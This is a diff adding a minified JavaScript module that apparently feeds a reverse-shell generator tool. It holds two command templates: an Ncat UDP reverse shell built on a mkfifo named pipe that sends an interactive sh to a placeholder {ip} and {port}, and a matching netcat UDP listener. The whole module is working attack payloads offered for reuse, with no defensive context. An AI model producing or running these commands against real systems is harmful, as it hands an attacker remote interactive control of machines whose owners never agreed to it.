@@ -1,0 +1,1 @@
+const t=[{title:"Ncat UDP mkfifo reverse shell",template:"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | ncat -u {ip} {port} >/tmp/f",description:"UDP reverse shell using mkfifo and Ncat for bidirectional communication."},{title:"Netcat UDP Listener",template:"nc -u -lvnp {port}"}],e={commands:t};export{t as commands,e as default};
